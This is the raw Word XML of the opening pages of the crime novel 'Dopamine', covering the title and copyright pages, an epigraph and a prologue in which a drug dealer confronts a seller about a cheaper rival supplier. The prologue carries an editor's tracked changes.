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488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="120" w:line="240" w:lineRule="atLeast"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:smallCaps/>
          <w:color w:val="7997DF"/>
          <w:sz w:val="180"/>
          <w:szCs w:val="180"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:smallCaps/>
          <w:color w:val="7997DF"/>
          <w:sz w:val="180"/>
          <w:szCs w:val="180"/>
        </w:rPr>
        <w:t>Dopamine</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRDefault="000D3488" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>A novel by</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004541C5" w:rsidRPr="00731F95" w:rsidRDefault="004541C5" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:b/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="48"/>
          <w:szCs w:val="48"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00731F95">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:b/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="48"/>
          <w:szCs w:val="48"/>
        </w:rPr>
        <w:t>Mikhail Voloshin</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="000D3488">
      <w:pPr>
        <w:pageBreakBefore/>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:textAlignment w:val="bottom"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="444444"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="444444"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>This is a work of fiction. Names, characters, places, and incidents either are the product of the author’s imagination or are used fictitiously, and any resemblance to actual persons, living or dead, events, or locales is entirely coincidental.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="444444"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="444444"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00731F95">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="444444"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Copyright 2016</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="444444"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> © Mikhail Voloshin</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="444444"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="444444"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="444444"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>All rights reserved.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="000245F4">
      <w:pPr>
        <w:pageBreakBefore/>
        <w:spacing w:after="0" w:line="330" w:lineRule="atLeast"/>
        <w:ind w:left="1020"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00B45500">
      <w:pPr>
        <w:pStyle w:val="ActBreak"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:lastRenderedPageBreak/>
        <w:t>Prologue</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00F62BCE">
      <w:pPr>
        <w:pStyle w:val="ChapterNum"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:lastRenderedPageBreak/>
        <w:t>1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:jc w:val="right"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>“The most lively thought is still inferior to the dullest sensation.”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="100" w:line="420" w:lineRule="atLeast"/>
        <w:jc w:val="right"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>— David Hume (1711-1776)</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Peanut shells crunched under</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> Eugene’s designer sneakers. He leaned against the carving-pocked bar, careful to avoid dipping the elbow of his custom-fit leather jacket into something sticky and unnameable. Around him, tattooed men with large bellies and larger beards swigged Jack Daniels and bragged about their horsepower beneath the blare of the jukebox.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didn’t mean to make trouble, Eugene,” a </w:t>
      </w:r>
      <w:del w:id="0" w:author="TextVet" w:date="2016-03-14T11:24:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004509F4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">young, </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">thin </w:t>
      </w:r>
      <w:ins w:id="1" w:author="TextVet" w:date="2016-03-14T11:24:00Z">
        <w:r w:rsidR="004509F4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">young </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">man </w:t>
      </w:r>
      <w:del w:id="2" w:author="TextVet" w:date="2016-03-14T11:25:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004509F4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">said </w:delText>
        </w:r>
      </w:del>
      <w:del w:id="3" w:author="TextVet" w:date="2016-03-14T11:24:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004509F4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>with a</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="4" w:author="TextVet" w:date="2016-03-14T17:35:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A732A5">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gulp</w:t>
      </w:r>
      <w:ins w:id="5" w:author="TextVet" w:date="2016-03-14T11:25:00Z">
        <w:r w:rsidR="004509F4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ed</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clapped</w:t>
      </w:r>
      <w:del w:id="6" w:author="TextVet" w:date="2016-03-14T11:25:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004509F4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> a hand firmly on</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> his shoulder. </w:t>
      </w:r>
      <w:ins w:id="7" w:author="TextVet" w:date="2016-03-14T11:27:00Z">
        <w:r w:rsidR="00B82965">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Any gentler and</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="8" w:author="TextVet" w:date="2016-03-14T11:26:00Z">
        <w:r w:rsidR="004509F4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> i</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="9" w:author="TextVet" w:date="2016-03-14T11:26:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004509F4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>I</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">t </w:t>
      </w:r>
      <w:ins w:id="10" w:author="TextVet" w:date="2016-03-14T11:26:00Z">
        <w:r w:rsidR="004509F4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>might</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="11" w:author="TextVet" w:date="2016-03-14T11:26:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004509F4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>could</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> have </w:t>
      </w:r>
      <w:ins w:id="12" w:author="TextVet" w:date="2016-03-14T11:27:00Z">
        <w:r w:rsidR="00B82965">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>passed for</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="13" w:author="TextVet" w:date="2016-03-14T11:27:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B82965">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>been</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a gesture of friendship</w:t>
      </w:r>
      <w:del w:id="14" w:author="TextVet" w:date="2016-03-14T11:26:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004509F4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>, but it wasn’t</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. “You cheat us, and think this wouldn’t make trouble?” He spoke fluidly, but his accent betrayed </w:t>
      </w:r>
      <w:del w:id="15" w:author="TextVet" w:date="2016-03-14T11:28:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00356EE7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">his </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Russian origins.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“It’s not just me!” </w:t>
      </w:r>
      <w:ins w:id="16" w:author="TextVet" w:date="2016-03-14T11:28:00Z">
        <w:r w:rsidR="00356EE7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">trembled </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>the fellow</w:t>
      </w:r>
      <w:ins w:id="17" w:author="TextVet" w:date="2016-03-14T11:28:00Z">
        <w:r w:rsidR="00356EE7">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 xml:space="preserve"> </w:t>
      </w:r>
      <w:ins w:id="18" w:author="TextVet" w:date="2016-03-14T11:29:00Z">
        <w:r w:rsidR="00356EE7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>words</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="19" w:author="TextVet" w:date="2016-03-14T11:29:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00356EE7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>s</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="20" w:author="TextVet" w:date="2016-03-14T11:28:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00356EE7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>aid shakily</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. “Jimmy jumped last week, and Martinez…”</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w:t>
      </w:r>
      <w:ins w:id="21" w:author="TextVet" w:date="2016-03-14T17:36:00Z">
        <w:r w:rsidR="00684FE1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>’</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="22" w:author="TextVet" w:date="2016-03-14T17:36:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00684FE1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> slid hi</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">s hand </w:t>
      </w:r>
      <w:ins w:id="23" w:author="TextVet" w:date="2016-03-14T17:36:00Z">
        <w:r w:rsidR="00684FE1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">pythoned </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>toward the man’s neck. “Do you think Sergey and I aren’t </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>painfully</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> aware, Francisco? How much is the street price for loyalty?”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like selling for you, Eugene,” Francisco stammered. “You and Sergey, you always treat me good. It’s just…”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new supplier’s product is </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>so</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> much better,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Francisco’s lips trembled. “Her staple is better than your samplers, chief. But that’s not the point.”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Eugene’s eyes narrowed. “What </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>is</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> the point, Francisco?”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murmured, “She charges a fifth of your prices.”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leaned in, pulling Francisco’s face to his ear. “I don’t think I heard you right. She’s undercutting us by a </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>fifth</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“Undercutting you </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>to</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> a fifth. What you sell for a grand, she sells for two hundred. They say she makes it locally, chief. She grows it in a tub of saltwater or something. Like with pot. What’s it called? ‘Hydroponic?’”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Eugene rolled his eyes. “Francisco, how did you get to be a salesman without knowing shit about your product? Coca is </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="24" w:author="TextVet" w:date="2016-03-14T17:37:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>not</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> like hemp. A kilogram of coca leaves will only yield five grams of blow. Farms need to harvest acres of crop just to break even. You would know this if you were not an idiot.”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just saying what I heard,” Francisco pleaded. “It checks out, though. Figure she’s got no import costs, no cartel dues, no </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Federales</w:t>
      </w:r>
